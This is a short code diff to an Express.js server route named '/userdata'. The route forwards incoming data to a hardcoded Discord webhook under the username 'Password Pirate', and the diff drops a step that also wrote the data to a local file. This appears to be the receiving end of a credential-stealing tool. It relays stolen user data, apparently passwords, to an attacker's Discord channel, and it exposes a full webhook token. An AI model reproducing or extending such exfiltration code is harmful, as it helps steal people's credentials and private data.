@@ -32,13 +32,9 @@ app.post("/userdata", (req, res, next) => {
         const axios = require('axios');
 
         axios.post('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
-            content: data
-        })
-
-        fs.writeFile("result.txt", data, (err) => {
-            if (err) console.log(err);
-            console.log("Successfully Written to File.");
-          });
+            content: data,
+            username: 'Password Pirate'
+        });
         res.sendStatus(200);
         return;
     } catch(err) {
